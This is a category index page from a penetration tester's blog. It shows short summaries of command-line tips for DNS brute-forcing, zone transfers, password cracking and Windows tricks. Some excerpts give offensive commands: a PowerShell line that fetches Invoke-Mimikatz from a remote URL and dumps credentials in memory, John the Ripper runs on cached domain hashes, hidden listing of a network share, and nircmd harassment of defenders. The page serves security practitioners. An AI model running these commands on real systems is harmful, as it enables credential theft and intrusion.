<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <title>
    Cli // Room362
  </title>

  <link href="http://gmpg.org/xfn/11" rel="profile">
<meta http-equiv="content-type" content="text/html; charset=utf-8">


<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="">
<meta name="generator" content="Hugo 0.16" />

  <meta property="og:title" content="Cli" />
<meta property="og:description" content="" />
<meta property="og:type" content="website" />
<meta property="og:locale" content="en_US" />
<meta property="og:url" content="https://room362.com/categories/cli/" />


  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
  
  
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
  
  

  <link rel="stylesheet" href="https://room362.com//css/redlounge.css">
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
  <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="/favicon.png">

  
  <link href="https://room362.com/categories/cli/index.xml" rel="alternate" type="application/rss+xml" title="Room362" />

    
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/tomorrow-night-bright.min.css">
  
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>


  

  

  

  
</head>

<body>
	<div id="layout" class="pure-g">
    <div class="sidebar pure-u-1 pure-u-md-1-4">
  <div class="header">
    

	
	  <img src="/images/headshot.png" class="sidebarphoto">
	

    <h1 class="brand-title">Room362</h1>
    <h2 class="brand-tagline">Blatherings of a security addict</h2>

    <nav class="nav">
      <ul class="nav-list">
        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://room362.com/">Home</a></li>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/brandon/">Brandon</a></li>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/about/">About</a></li>
        
      </ul>
    </nav>

    
    <div class="social-buttons">
      
        
        <a href="/index.xml" target="_blank"><i class='fa fa-rss'></i></a>
        
      
        
        <a href="https://linkedin.com/in/mubix" target="_blank"><i class='fa fa-linkedin'></i></a>
        
      
        
        <a href="https://twitter.com/mubix" target="_blank"><i class='fa fa-twitter'></i></a>
        
      
      
    </div>
    

  </div>
</div>


    <div class="content pure-u-1 pure-u-md-3-4">
      <a name="top"></a>
      

      <div class="posts">
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2014/2014-01-29-hostname-bruteforcing-on-the-cheap/">Hostname bruteforcing on the cheap</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>29</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jan</span> <span class="post-date-year">2014</span>
		          </span>
      				
      				
      					
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>5 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-cli" href="https://room362.com//categories/cli">cli</a>
      					
					        <a class="post-category post-category-dig" href="https://room362.com//categories/dig">dig</a>
      					
					        <a class="post-category post-category-dns" href="https://room362.com//categories/dns">dns</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Quick update: As @MikeDamm points out, xargs has a -P option that can do the same thing I&rsquo;m using parallel for. If you have a supported version of xargs you can use -P 0 to do the same thing as -j0 with parallel, but if your version doesn&rsquo;t support the 0 you can simply use the same number parallel uses ala: cat subdomains.txt | xargs -P 122 -I subdomain dig +noall subdomain.microsoft.com +answer This results in roughly the same completion time as it&rsquo;s parallel counterpart.
            </article>
			<div class="read-more-link">
				<a href="/post/2014/2014-01-29-hostname-bruteforcing-on-the-cheap/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/">Dumping a domain worth of passwords with mimikatz</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>5</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Oct</span> <span class="post-date-year">2013</span>
		          </span>
      				
      				
      					
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>4 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-mimikatz" href="https://room362.com//categories/mimikatz">mimikatz</a>
      					
					        <a class="post-category post-category-cli" href="https://room362.com//categories/cli">cli</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	clymb3r recently posted a script called &ldquo;Invoke-Mimikatz.ps1&rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL. You can very easily use this script directly from an admin command prompt as so: powershell &quot;IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds&quot; (This works REALLY well for Citrix and Kiosk scenarios and it&rsquo;s too hard to type/remember) This runs the powershell script by directly pulling it from Github and executing it &ldquo;in memory&rdquo; on your system.
            </article>
			<div class="read-more-link">
				<a href="/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2013/2013-10-04-ad-zone-transfers-as-a-user/">AD Zone Transfers as a user</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>4</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Oct</span> <span class="post-date-year">2013</span>
		          </span>
      				
      				
      					
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-active-directory" href="https://room362.com//categories/active-directory">active directory</a>
      					
					        <a class="post-category post-category-powershell" href="https://room362.com//categories/powershell">powershell</a>
      					
					        <a class="post-category post-category-cli" href="https://room362.com//categories/cli">cli</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	cross posted from: http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html The tired and true method for Zone Transfers are using either nslookup: nslookup ls -d domain.com.local Or dig: dig -t AXFR domain.com.local @ns1.domain.com.local In the Windows Enterprise world there are a few more options. If you are a DNS Admin you can use the &lsquo;dnscmd&rsquo; command like so: dnscmd /EnumZones dnscmd /ZonePrint domain.com.local Which is handy if you can pop the DNS server (usually the Domain Controller so you usually have better things to do at that point).
            </article>
			<div class="read-more-link">
				<a href="/post/2013/2013-10-04-ad-zone-transfers-as-a-user/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2013/2013-05-30-query-all-windows-services-config-from-the-command-line-html/">Query all windows services config from the command line</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>30</sup></span><span class="post-date-separator">/</span><span class="post-date-month">May</span> <span class="post-date-year">2013</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-cli" href="https://room362.com//categories/cli">cli</a>
      					
					        <a class="post-category post-category-privesc" href="https://room362.com//categories/privesc">privesc</a>
      					
					        <a class="post-category post-category-services" href="https://room362.com//categories/services">services</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	This is how I did it: for /f &quot;tokens=5 delims=&quot; %A in ('reg query HKLM\SYSTEM\CurrentControlSet\Services') do sc qc %A Let me know if you know of a better way. If you don&rsquo;t know why this could be important read here: http://www.ihtb.org/security/program.exe-privilege_escalation.txt If you are on a Win7 box or otherwise have the option to use WMI you can use the following command: wmic service get pathname
            </article>
			<div class="read-more-link">
				<a href="/post/2013/2013-05-30-query-all-windows-services-config-from-the-command-line-html/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2013/2013-03-18-length-sorting-wordlists/">Length Sorting Wordlists</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>18</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Mar</span> <span class="post-date-year">2013</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-cracking" href="https://room362.com//categories/cracking">cracking</a>
      					
					        <a class="post-category post-category-cli" href="https://room362.com//categories/cli">cli</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	This is one of those stupid simple things that are easy to forget so I&rsquo;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&rsquo;t have to, but there is times where it&rsquo;s important. Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits.
            </article>
			<div class="read-more-link">
				<a href="/post/2013/2013-03-18-length-sorting-wordlists/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-12-24-delete-trustedinstaller-only-files-and-folders/">Delete TrustedInstaller-only Files and Folders</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>24</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Dec</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-cli" href="https://room362.com//categories/cli">cli</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Not very security related, but something I don&rsquo;t want to forget how to do. It was a PITA. So I had a old WINDOWS directory that I needed to get rid of. And the following commands gave me the ooomph needed to get the job done. 1) Get a SYSTEM shell so all modding of permissions will be good. psexec /accepteula -i -s cmd 2) Grant Administrators FULL rights to the directory and all sub directories and files icacls C:\Windows\* /grant Administrators:F /C /T 3) Finish the job, delete the folder and everything below it rmdir /s /q C:\Windows\ All done.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-12-24-delete-trustedinstaller-only-files-and-folders/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-11-13-smash-and-grab-windows-dir-lists/">Smash and Grab: Windows Dir Lists</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>13</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Nov</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-cli" href="https://room362.com//categories/cli">cli</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Looking through network shares can be slow, and waiting for individual searches to finish looking through the whole &ldquo;drive&rdquo; is redundant. Easier to just use some Windows voodoo to get a good list to look through offline: start /b cmd /c dir /b /s \\nas\users_home_share$ ^&gt; shareinfo.txt Breaking that down: start /b - starts a process that won&rsquo;t hang up our current one, with the &ldquo;b&rdquo; flag meaning &ldquo;background&rdquo;, yay not visible to the user!
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-11-13-smash-and-grab-windows-dir-lists/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2011/2011-09-15-disconnect-stalled-ssh-session/">Disconnect Stalled SSH Session</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>15</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Sep</span> <span class="post-date-year">2011</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-ssh" href="https://room362.com//categories/ssh">ssh</a>
      					
					        <a class="post-category post-category-cli" href="https://room362.com//categories/cli">cli</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	This doesn&rsquo;t really apply to Windows users as you can just close puTTy. But for everyone else, stalled SSH Sessions suck. You are either slamming enter to get it to realize it&rsquo;s been disconnected or just waiting for it to. Well, for those of us who are impatient just hit: ~. Thats right, SHIFT + the key above TAB, release, and hit the period. You may have to hit ENTER first to clear the buffer or whatever it does, but do that and it will disconnect the SSH session right away.
            </article>
			<div class="read-more-link">
				<a href="/post/2011/2011-09-15-disconnect-stalled-ssh-session/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/">Multiple Dictionaries or Wordlists Using John the Ripper</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>12</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Sep</span> <span class="post-date-year">2011</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-cracking" href="https://room362.com//categories/cracking">cracking</a>
      					
					        <a class="post-category post-category-john-the-ripper" href="https://room362.com//categories/john-the-ripper">john the ripper</a>
      					
					        <a class="post-category post-category-cli" href="https://room362.com//categories/cli">cli</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	John the ripper only takes one word list at a time. There are plenty of docs out there that show you how to cat all of your dictionaries into John&rsquo;s stdin function but I like to run rules against my lists and I didn&rsquo;t see any how-tos on doing this. Here is my way: ls dicts | xargs -t -I file ./john --pot=victim.pot --format=mscash --wordlist=dicts/file --rules victim_cachedump.txt This command will ls the &lsquo;dicts&rsquo; directory, pipe it to xargs, which will spit out the command it uses for each itteration (-t) and replace every time it see the word file with the line/itteration its on (-I).
            </article>
			<div class="read-more-link">
				<a href="/post/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2011/2011-03-05-psychological-warfare-with-nircmd/">Psychological Warfare with NirCMD</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>5</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Mar</span> <span class="post-date-year">2011</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-ccdc" href="https://room362.com//categories/ccdc">ccdc</a>
      					
					        <a class="post-category post-category-nircmd" href="https://room362.com//categories/nircmd">nircmd</a>
      					
					        <a class="post-category post-category-cli" href="https://room362.com//categories/cli">cli</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	One of the best ways to throw blue teamers off the scent of another host getting owned, which also has the added effect of stressing them out is a batch script that runs through some of the more annoying features in nircmd.exe in succession and at regular intervals: http://www.nirsoft.net/utils/nircmd.html setdisplay 640x480 killprocess taskmgr.exe killprocess procexp.exe win -style title &ldquo;my computer&rdquo; 0x00c00000 win child title &ldquo;my computer&rdquo; +exstyle all 0x00400000 win +exstyle title &ldquo;my computer&rdquo; 0x00400000 win trans ititle &ldquo;internet explorer&rdquo; 256 win close class &ldquo;CabinetWClass&rdquo; multiremote copy &ldquo;c:tempcomputers.txt&rdquo; exitwin poweroff force exitwin logoff standby monitor off win child class &ldquo;Shell_TrayWnd&rdquo; hide class &ldquo;button&rdquo; win hide class progman Just to name a few&hellip; another fun batch script to have running is &lsquo;echo knock knock | clip&rsquo; in an endless and delayless loop.
            </article>
			<div class="read-more-link">
				<a href="/post/2011/2011-03-05-psychological-warfare-with-nircmd/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
      </div>

      <div class="footer">
	<hr class="thin" />
	<div class="pure-menu pure-menu-horizontal pure-menu-open">
		<ul class="footer-menu">
		
			<li><a href="/about">About</a></li>
		
			<li><a href="/post">Blog</a></li>
		
		</ul>
	</div>

	<p>&copy; 2016. All rights reserved.</p>
</div>
    </div>
  </div>
  
</body>
</html>
